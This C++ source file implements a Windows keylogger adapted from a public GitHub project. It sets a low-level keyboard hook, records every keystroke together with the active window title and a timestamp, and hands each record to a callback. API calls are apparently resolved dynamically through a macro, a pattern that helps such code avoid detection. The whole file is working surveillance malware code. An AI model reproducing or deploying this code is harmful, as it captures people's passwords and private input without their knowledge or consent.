#include "keylogger.h"
#include <cstring>
#include <cstdio>
#include <time.h>
#include <fstream>
#include <sstream>
#include <map>
#include <string>

#if USING_KB_HOOK

// copied from: https://github.com/GiacomoLaw/Keylogger/blob/master/windows/klog_main.cpp
// 2024/02/07 source code last modified
// 2025/02/24 this file last modified

//////////////////////////////////////////////////////////////////////////

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// Defines whether you want to enable or disable
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname {
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN,	"\n" },
    {VK_SPACE,	"_" },
    {VK_TAB,	"[TAB]" },
    {VK_SHIFT,	"[SHIFT]" },
    {VK_LSHIFT,	"[LSHIFT]" },
    {VK_RSHIFT,	"[RSHIFT]" },
    {VK_CONTROL,	"[CONTROL]" },
    {VK_LCONTROL,	"[LCONTROL]" },
    {VK_RCONTROL,	"[RCONTROL]" },
    {VK_MENU,	"[ALT]" },
    {VK_LWIN,	"[LWIN]" },
    {VK_RWIN,	"[RWIN]" },
    {VK_ESCAPE,	"[ESCAPE]" },
    {VK_END,	"[END]" },
    {VK_HOME,	"[HOME]" },
    {VK_LEFT,	"[LEFT]" },
    {VK_RIGHT,	"[RIGHT]" },
    {VK_UP,		"[UP]" },
    {VK_DOWN,	"[DOWN]" },
    {VK_PRIOR,	"[PG_UP]" },
    {VK_NEXT,	"[PG_DOWN]" },
    {VK_OEM_PERIOD,	"." },
    {VK_DECIMAL,	"." },
    {VK_OEM_PLUS,	"+" },
    {VK_OEM_MINUS,	"-" },
    {VK_ADD,		"+" },
    {VK_SUBTRACT,	"-" },
    {VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

// A callback function for processing record by user.
typedef int (CALLBACK* Callback)(const char* record, void* user);

// Global variables.

HHOOK _hook = NULL;
Callback _cllback = NULL;
void* _user = NULL;

// Save parse keyboard information and use callback to process record.
int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[MAX_PATH] = {};
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2)) {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    HKL layout = NULL;

    if (foreground) {
        // get keyboard layout of the thread
        GET_PROCESS_EASY(GetWindowThreadProcessId);
        DWORD threadID = GetWindowThreadProcessId(foreground, NULL);
        GET_PROCESS_EASY(GetKeyboardLayout);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground) {
        char window_title[MAX_PATH] = {};
        GET_PROCESS_EASY(GetWindowTextA);
        GetWindowTextA(foreground, (LPSTR)window_title, MAX_PATH);

        if (strcmp(window_title, lastwindow) != 0) {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // get time
            SYSTEMTIME   s;
            GetLocalTime(&s);
            char tm[64];
            sprintf_s(tm, "%d-%02d-%02d  %02d:%02d:%02d", s.wYear, s.wMonth, s.wDay,
                      s.wHour, s.wMinute, s.wSecond);

            output << "\r\n\r\n[标题:] " << window_title << "\r\n[时间:]" << tm << "\r\n[内容:]";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end()) {
        output << keyname.at(key_stroke);
    } else {
        GET_PROCESS_EASY(GetKeyState);
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        GET_PROCESS_EASY(MapVirtualKeyExA);
        char key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase) {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.
    if (NULL != _cllback) {
        _cllback(output.str().c_str(), _user);
    }

    return 0;
}

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT WINAPI HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0) {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN) {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            // This struct contains the data received by the hook callback. As you see in the callback function
            // it contains the thing you will need: vkCode = virtual key code.
            KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    GET_PROCESS_EASY(CallNextHookEx);
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

// Set the hook and set it to use the callback function provided.
bool SetHook(Callback callback, void* user)
{
    if (NULL != _hook)
        return true;

    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    GET_PROCESS_EASY(SetWindowsHookExA);
    if (NULL != (_hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
        _cllback = callback;
        _user = user;
        return true;
    }
    return false;
}

// Release the hook.
void ReleaseHook()
{
    if (NULL != _hook) {
        GET_PROCESS_EASY(UnhookWindowsHookEx);
        UnhookWindowsHookEx(_hook);
        _hook = NULL;
        _cllback = NULL;
        _user = NULL;
    }
}

#endif
